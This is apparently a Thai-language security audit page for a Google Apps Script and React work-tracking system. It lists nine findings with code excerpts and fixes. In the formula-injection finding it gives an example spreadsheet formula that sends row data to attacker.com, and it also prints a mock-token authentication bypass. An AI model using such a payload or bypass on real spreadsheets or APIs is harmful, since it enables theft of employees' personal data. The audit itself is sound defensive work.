# Security Vulnerabilities & Remediation / รายงานช่องโหว่ด้านความปลอดภัยและแนวทางแก้ไข

เอกสารนี้รวบรวมข้อบกพร่องและจุดอ่อนด้านความปลอดภัยของข้อมูล (Security Vulnerabilities) ที่ตรวจพบในระบบ **WUS Track DB System** ทั้งในส่วนของระบบปลายทางหลังบ้าน (Google Apps Script API) และส่วนติดต่อผู้ใช้งานด้านหน้า (React Client-side UI) พร้อมนำเสนอรายละเอียดผลกระทบและแนวทางการแก้ไขอย่างชัดเจน

---

## 🔒 1. การข้ามระบบตรวจสอบตัวตนฝั่งไคลเอนต์ (Client-Side Login Bypass)
* **รหัสอ้างอิง:** SEC-01
* **ผลการตรวจสอบ (Observation):**
  * ฟังก์ชันการล็อกอินถูกตรวจสอบในระดับเบราว์เซอร์ของผู้ใช้เท่านั้น โดยใช้เพียงแค่อีเมลในการเทียบหาความตรงกันจากตัวแปร `masterData.users` ที่ได้จากเซิร์ฟเวอร์โดยไม่มีการเทียบรหัสผ่านหรือโทเค็นความปลอดภัยใด ๆ (จากไฟล์ `wus-track/src/assets/App.tsx` บรรทัดที่ 55–64):
    ```typescript
    const handleLogin = (email: string) => {
        if (!masterData) return;
        const user = masterData.users.find(u => u.Email.toLowerCase() === email.toLowerCase());
        if (user) {
            setCurrentUser(user);
            localStorage.setItem('wus_user', JSON.stringify(user));
        } else {
            alert('ไม่พบอีเมลในระบบ หรือคุณไม่มีสิทธิ์เข้าใช้งาน');
        }
    };
    ```
  * นอกจากนี้ ข้อมูลผู้ใช้ล็อกอินสามารถปลอมแปลงได้อย่างง่ายดายด้วยการสร้าง/แก้ไขอ็อบเจกต์ในหน่วยความจำถาวร `localStorage` ภายใต้ชื่อคีย์ `wus_user` เนื่องจากตัวโปรแกรมจะเชื่อใจสถานะในระบบดังกล่าวทันทีที่เริ่มต้นรันหน้าเว็บใหม่ (บรรทัด 105–108)
* **ผลกระทบ (Impact):** Visually High. ผู้ใช้งานทั่วไปหรือผู้ไม่หวังดีสามารถสืบค้นรายชื่ออีเมลของพนักงานผ่านช่องโหว่การรั่วไหลข้อมูล (ดูข้อถัดไป SEC-02) จากนั้นนำมากรอกเพื่อแอบอ้างสิทธิ์การเข้าใช้งานในระบบในฐานะพนักงานคนใดก็ได้ รวมทั้งสามารถเขียนหรือแก้ไขบันทึกงานโดยใช้ชื่อบุคคลอื่นได้ทั้งหมด
* **แนวทางแก้ไข (Remediation):**
  1. ย้ายตรรกะการตรวจสอบสิทธิ์ล็อกอินไปทำงานบน Backend Server เท่านั้น
  2. จัดทำระบบลงชื่อเข้าใช้ที่ต้องใช้รหัสผ่าน (Password-based login) หรือระบุรหัส OTP ส่งไปยังอีเมลของพนักงาน
  3. เมื่อล็อกอินสำเร็จ ให้แบ็กเอนด์ทำการลงนามออก JSON Web Token (JWT) หรือสร้าง Session ID ที่มีความปลอดภัย และนำคีย์นี้ไปแนบใน Authorization Header ทุกครั้งที่มีการส่งข้อมูล

---

## 📡 2. การเปิดเผยข้อมูลภายในต่อสาธารณะโดยไม่มีการตรวจสอบสิทธิ์ (Unauthenticated Public Endpoints & Data Leaks)
* **รหัสอ้างอิง:** SEC-02
* **ผลการตรวจสอบ (Observation):**
  * ในไฟล์แบ็กเอนด์ `backend/Code.gs` (บรรทัดที่ 32–44) ส่วนประมวลผลคำขอ GET `doGet(e)` ปล่อยให้บุคคลทั่วไปเรียกเข้าถึงและขอรับชุดข้อมูลทั้งหมด (Metadata Dump) โดยไม่มีการพิสูจน์ตัวตน:
    ```javascript
    function doGet(e) {
      var action = (e && e.parameter) ? e.parameter.action : null;
      if (!action) {
        return ok({
          workTypes: populateWorkTypes(),
          users: getAllUsers(), // ส่งรายชื่อ รหัส และอีเมลพนักงานทุกคนออกไป
          submissions: getTodaySubmissions(),
          templates: getTemplates(),
          delegations: getActiveDelegations(),
          status: "success"
        });
      }
    ```
  * ข้อมูลที่สืบค้นเพื่อนำไปแสดงผลรายวันอย่าง `getTodayData` ในบรรทัดที่ 47 ก็นำส่งข้อมูลพนักงานคนใดก็ได้ เพียงแค่ผ่านพารามิเตอร์ `employeeCode` และ `date` ทาง URL เปล่า ๆ:
    ```javascript
    if (action === "getTodayData") return getTodayData(e.parameter.employeeCode, e.parameter.date);
    ```
* **ผลกระทบ (Impact):** High. ข้อมูลส่วนบุคคลของพนักงานทุกคน (อีเมล, ชื่อ-นามสกุล, รหัสพนักงาน) รวมถึงบันทึกและเทมเพลตต่าง ๆ จะถูกเผยแพร่สู่สาธารณะ ซึ่งขัดกับหลักเกณฑ์ความมั่นคงปลอดภัยของข้อมูล และ พ.ร.บ. คุ้มครองข้อมูลส่วนบุคคล (PDPA)
* **แนวทางแก้ไข (Remediation):**
  1. กำหนดรหัสผ่านความปลอดภัย (API Key) หรือ Token ในระดับ Backend โดยผู้เรียกใช้งานต้องแนบตัวแปรดังกล่าวเพื่อตรวจสอบสิทธิ์ก่อนส่งคืนข้อมูล เช่น:
     ```javascript
     var token = e.parameter.token;
     if (token !== SCRIPT_PROPERTIES.getProperty("API_TOKEN")) {
       return ok({ status: "error", message: "Unauthorized" });
     }
     ```
  2. ยกเลิกการแสดงข้อมูลผู้ใช้ทั้งหมด (`users`) และข้อมูลละเอียดอ่อนอื่น ๆ ในการเรียกใช้งานที่ไม่ได้ระบุชื่อผู้ส่งแบบจำเพาะ

---

## 💉 3. ช่องโหว่การฝังสูตรคำนวณสเปรดชีตประสงค์ร้าย (Formula / CSV Injection Risk)
* **รหัสอ้างอิง:** SEC-03
* **ผลการตรวจสอบ (Observation):**
  * ข้อมูลนำเข้าจากฟิลด์ข้อความอิสระ เช่น "ปัญหา" (problem), "หัวข้อ" (topic), หรือ "รายละเอียด" (detail) จะถูกเขียนลงในเซลล์สเปรดชีตตรง ๆ ผ่านคำสั่ง `.setValue()` และ `.appendRow()` โดยไม่มีการกรองหรือแปลงอักขระควบคุม (ในไฟล์ `backend/Code.gs` บรรทัดที่ 112, 115, 320–326):
    ```javascript
    sheet.getRange(rowIndex, targetCol).setValue(workData[code]);
    if (problemCol) sheet.getRange(rowIndex, problemCol).setValue(problem);
    ```
* **ผลกระทบ (Impact):** Critical. หากมีผู้ใช้กรอกข้อความที่เริ่มต้นด้วยสัญลักษณ์ประเมินค่าสูตรของสเปรดชีต เช่น `=`, `+`, `-`, หรือ `@` ระบบ Google Sheets จะประมวลผลทันทีเมื่อเปิดไฟล์ ตัวอย่างเช่น ข้อความ:
  ```text
  =HYPERLINK("http://attacker.com/leak?data="&CONCATENATE(A2:Z10), "Click to View Details")
  ```
  เมื่อผู้ดูแลระบบสเปรดชีตเปิดไฟล์และคลิกปุ่มดังกล่าว สูตรจะรันและดึงข้อมูลแถวทั้งหมดส่งไปยังเซิร์ฟเวอร์ของผู้โจมตี หรือเรียกใช้ฟังก์ชัน `=IMPORTXML` เพื่อส่งออกข้อมูลโดยอัตโนมัติ
* **แนวทางแก้ไข (Remediation):**
  * ก่อนจะบันทึกค่าสตริงใด ๆ จากผู้ใช้ลงสเปรดชีต ให้ตรวจสอบว่าอักขระตัวแรกเป็นเครื่องหมายสูตรหรือไม่ หากใช่ให้ทำการเติมเครื่องหมายอัญประกาศเดี่ยว (Single Quote `'`) นำหน้าสตริงนั้น เพื่อบังคับให้ Google Sheets มองว่าเป็นเพียงข้อความดิบ (Raw text) และไม่ถูกประมวลผลเป็นสูตร:
    ```javascript
    function sanitizeFormulaInput(value) {
      if (typeof value === "string") {
        var trimmed = value.trim();
        if (trimmed.startsWith("=") || trimmed.startsWith("+") || trimmed.startsWith("-") || trimmed.startsWith("@")) {
          return "'" + value; // เติมเครื่องหมาย ' นำหน้า
        }
      }
      return value;
    }
    ```

---

## 🕳️ 4. ปัญหาบันทึกข้อมูลล้มเหลวอย่างเงียบ (Silent Database Insertion Failure)
* **รหัสอ้างอิง:** SEC-04
* **ผลการตรวจสอบ (Observation):**
  * **ความต่างของข้อมูลส่งออกฝั่งไคลเอนต์ (Frontend Contract):** ในไฟล์ `App.tsx` มีการห่อหุ้มโครงสร้างฟอร์มข้อมูลทั้งหมดให้อยู่ภายในตัวแปรย่อยชื่อ `payload`:
    ```typescript
    const payload = { ...formData, staffEmail: currentUser?.Email };
    // ส่งข้อมูลแบบ nested payload
    body: JSON.stringify({ action, payload })
    ```
  * **ความต้องการฝั่งแบ็กเอนด์ (Backend Contract):** ในสคริปต์ `Code.gs` ฟังก์ชัน `saveWorkData(postData)` หวังว่าพารามิเตอร์ที่ใช้บันทึก (เช่น `workData`, `employeeCode`) จะอยู่ในชั้นแรก (Top-level) ของ JSON object:
    ```javascript
    function saveWorkData(postData) {
      var dateStr = postData.date;
      var employeeCode = postData.employeeCode;
      var workData = postData.workData; // postData.workData จะเป็น undefined เสมอเนื่องจากถูกซ้อนใน payload
    ```
    สิ่งนี้ทำให้ Apps Script เกิดข้อผิดพลาดรันไทม์ `TypeError` ขณะพยายามแกะข้อมูลว่างเพื่อไปประมวลผลต่อ
  * **การพรางข้อผิดพลาดด้วย `no-cors`:** ตัวส่งของ Frontend ส่งข้อมูลด้วยโหมดดักกลับข้ามไซต์แบบทึบแสง (`mode: "no-cors"`):
    ```typescript
    await fetch(API_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'text/plain' },
        body: JSON.stringify({ action, payload })
    });
    ```
* **ผลกระทบ (Impact):** Critical Data Loss. การใช้โหมด `no-cors` จะบังคับให้ API ตอบกลับด้วยค่าแบบทึบแสง (Opaque Response) ซึ่งฝั่ง React จะประมวลผลเสมือนว่าการเชื่อมต่อเป็น 200 (Success) ตลอดเวลา แอปจะขึ้นข้อความแจ้งเตือนสีเขียวแก่ผู้ใช้ว่า **"บันทึกข้อมูลเรียบร้อยแล้ว!"** ทั้ง ๆ ที่ข้อมูลจริงเกิดข้อผิดพลาดระดับเซิร์ฟเวอร์และพังทับไปโดยไม่มีสิ่งใดถูกบันทึกลงในสเปรดชีต
* **แนวทางแก้ไข (Remediation):**
  1. ปรับเปลี่ยนโครงสร้างการส่งข้อมูลของทั้งสองฝั่งให้ตรงกัน โดยเลือกการดึงค่าจาก `.payload` ในฝั่ง Backend หรือปรับฟอร์มให้ส่งแบบ Flat structure ในฝั่ง Frontend
  2. ยกเลิกการเรียกใช้โหมด `mode: "no-cors"` เพื่อปล่อยให้ระบบสามารถดักจับสถานะข้อผิดพลาด HTTP 500 หรือ JSON Error จากฝั่งแบ็กเอนด์ได้
  3. ตั้งค่าการยอมรับข้ามไซต์ (CORS - Cross-Origin Resource Sharing) ใน Apps Script โดยส่งส่วนหัวกลับอย่างเหมาะสมผ่าน `HtmlService` หรือสร้าง API response ที่ครอบด้วย Callback สำหรับอนุญาตการเรียกใช้โดเมนแอป:
     ```javascript
     function ok(obj) {
       return ContentService.createTextOutput(JSON.stringify(obj))
         .setMimeType(ContentService.MimeType.JSON);
     }
     ```

---

## 🔒 5. การขาดการควบคุมสิทธิ์ในการเขียนข้อมูล (Lack of Write Authorization on API POST)
* **รหัสอ้างอิง:** SEC-05
* **ผลการตรวจสอบ (Observation):**
  * ฟังก์ชัน `doPost(e)` ในสคริปต์ `Code.gs` รันงานประเมินผลผ่าน `saveWorkData`, `saveFeedback`, `saveDelegation` โดยไม่มีเงื่อนไขใดในการตรวจสอบว่าผู้ส่งข้อมูลนี้มาจาก React Frontend ของแท้ หรือมีการล็อกอินเรียบร้อยจริงหรือไม่ ผู้ใช้จาก API Client ภายนอกสามารถส่ง POST JSON เข้ามาเพื่อสร้างหรืออัปเดตข้อมูลได้ทันที
* **ผลกระทบ (Impact):** High. ผู้ไม่ประสงค์ดีสามารถสแปมหรือยิงถล่มข้อมูลปลอม (Spam Submission) เข้ามาทำลายระบบและทำให้ขีดจำกัดโควตาการเขียนข้อมูลของ Google API เต็ม ส่งผลให้ผู้ใช้รายอื่นไม่สามารถบันทึกข้อมูลการทำงานได้
* **แนวทางแก้ไข (Remediation):**
  * ปรับฟังก์ชัน `doPost(e)` ให้รับพารามิเตอร์ Token หรือลายเซ็นความปลอดภัย (Signature Token) ที่สร้างร่วมกับสิทธิ์เซสชันของผู้ใช้ และปฏิเสธการประมวลผลหาก Token ไม่ถูกต้องหรือไม่ผ่านการทดสอบอายุการใช้งาน

---

## 🔒 6. ปัญหารันไทม์ตัวแปร `today` ถูกอ้างอิงก่อนการประกาศ (ReferenceError: `today is not defined`)
* **รหัสอ้างอิง:** SEC-06
* **ผลการตรวจสอบ (Observation):**
  * ในไฟล์ `backend.gs` บรรทัดที่ 51-90 ฟังก์ชัน `verifySessionToken(sessionToken)` มีการเข้าถึงและเปรียบเทียบตัวแปร `today` ในบรรทัดที่ 85 (`today > expiresAt`) 
  * อย่างไรก็ดี ตัวแปร `today` ถูกประกาศภายในบล็อกเงื่อนไข `if (shouldRestrictWorkdays(ss))` ในบรรทัดที่ 65 เท่านั้น หากเงื่อนไขการจำกัดวันทำงานเป็นเท็จ บล็อกนี้จะไม่ทำงาน ส่งผลให้ตัวแปร `today` ไม่ได้รับการกำหนดค่าเริ่มต้นและทำให้เกิด ReferenceError หรือเงื่อนไขล้มเหลว
* **ผลกระทบ (Impact):** High. หากปิดการจำกัดวันทำงาน (Restrict Workdays) ทุกการบันทึกข้อมูลหลักที่ต้องตรวจสอบเซสชันผ่าน API จะพังทลายทันทีเนื่องจากข้อผิดพลาดรันไทม์ของสคริปต์
* **แนวทางแก้ไข (Remediation):**
  * ประกาศและกำหนดค่าเริ่มต้นให้ตัวแปร `today` ที่ระดับบนสุดของฟังก์ชัน `verifySessionToken` ก่อนจะเริ่มเข้าสู่เงื่อนไขการตรวจสอบใด ๆ:
    ```javascript
    function verifySessionToken(sessionToken) {
      var today = new Date(); // ประกาศไว้บนสุด
      ...
    }
    ```

---

## 🔒 7. การฝังไอดีฐานข้อมูลในโค้ด (Hardcoded Spreadsheet ID)
* **รหัสอ้างอิง:** SEC-07
* **ผลการตรวจสอบ (Observation):**
  * ในไฟล์ `backend.gs` บรรทัดที่ 4 มีการประกาศตัวแปร `SPREADSHEET_ID` แบบ Hardcoded:
    ```javascript
    var SPREADSHEET_ID = "1AL0AHGleUZ1UmS2N3QAg3vM0z_E1ymJ8Eg9FfUneAD0";
    ```
* **ผลกระทบ (Impact):** Medium. ทำให้ยากต่อการเปลี่ยนผ่านระหว่างสภาพแวดล้อมระบบทดสอบ (Dev/Staging) และระบบจริง (Production) อีกทั้งหากโค้ดถูกนำขึ้นระบบเผยแพร่สาธารณะ (เช่น GitHub) ไอดีสเปรดชีตหลักจะรั่วไหลทันที
* **แนวทางแก้ไข (Remediation):**
  * ย้ายไอดีสเปรดชีตไปเก็บไว้ใน Apps Script Script Properties แทนการ Hardcode ในซอร์สโค้ด:
    ```javascript
    var SPREADSHEET_ID = PropertiesService.getScriptProperties().getProperty("SPREADSHEET_ID");
    ```

---

## 🔒 8. ช่องโหว่ Mock Token Bypass บน Production Code
* **รหัสอ้างอิง:** SEC-08
* **ผลการตรวจสอบ (Observation):**
  * ในไฟล์ `backend.gs` มีการตั้งค่า Mock Token สำหรับข้ามการเช็คสิทธิ์ (Bypass Auth) บนโค้ดจริงในบรรทัดที่ 53-55:
    ```javascript
    if (sessionToken === "mock-token-123") {
      return { email: "mock@wu.ac.th", name: "Mock User" };
    }
    ```
* **ผลกระทบ (Impact):** Critical. ในระบบที่เผยแพร่จริง หากมีคนทราบชื่อโทเค็นจำลองนี้ จะสามารถยิง API เพื่อข้ามผ่านการตรวจสอบตัวตน (Auth Bypass) และบันทึกหรือทำลายข้อมูลในสเปรดชีตทั้งหมดได้ทันที
* **แนวทางแก้ไข (Remediation):**
  * ลบเงื่อนไข Mock Token ออกจาก Production Code หรือเขียนเงื่อนไขตรวจสอบว่าแอปกำลังทำงานบนเครื่อง Localhost จริงผ่านสภาพแวดล้อมที่ตั้งค่าไว้เท่านั้น

---

## 🔒 9. ขาดระบบควบคุมอัตราการขอ OTP (No Rate Limiting for OTP Requests)
* **รหัสอ้างอิง:** SEC-09
* **ผลการตรวจสอบ (Observation):**
  * ในฟังก์ชันการส่งรหัสผ่านใช้ครั้งเดียว (OTP Request) ไม่มีสคริปต์ควบคุมปริมาณการส่งคำขอของผู้ใช้ (Rate Limiter) ต่อหนึ่งอีเมล
* **ผลกระทบ (Impact):** Medium. เปิดโอกาสให้ผู้ใช้งานหรือสคริปต์บอทยิงคำขอ OTP ถล่มระบบ (OTP Flooding) ส่งผลให้โควตาบริการส่งอีเมล (เช่น GmailApp.sendEmail) ของ Google Account เต็มอย่างรวดเร็ว และก่อให้เกิดค่าใช้จ่ายที่ไม่คาดคิด
* **แนวทางแก้ไข (Remediation):**
  * เก็บค่าเวลาการขอ OTP ล่าสุดของแต่ละอีเมลลงในตารางสเปรดชีตชั่วคราว และไม่อนุญาตให้สร้าง OTP ใหม่จนกว่าเวลาจะผ่านไปอย่างน้อย 60 วินาที

---

## 🔗 ลิงก์ที่เกี่ยวข้อง (Cross-References)
* **[สารบัญวิกิ](./index.md)** - กลับไปหน้าสารบัญหลัก
* **[สถาปัตยกรรมระบบ](./architecture.md)** - ดูการเชื่อมโยงของ API และการจัดเรียงโครงสร้างไฟล์
* **[รายงานการเข้าถึงระบบ (WCAG)](./wcag.md)** - ปัญหาความเหลื่อมล้ำในการเข้าใช้งานและแนวทางปรับปรุงส่วนติดต่อผู้ใช้งาน
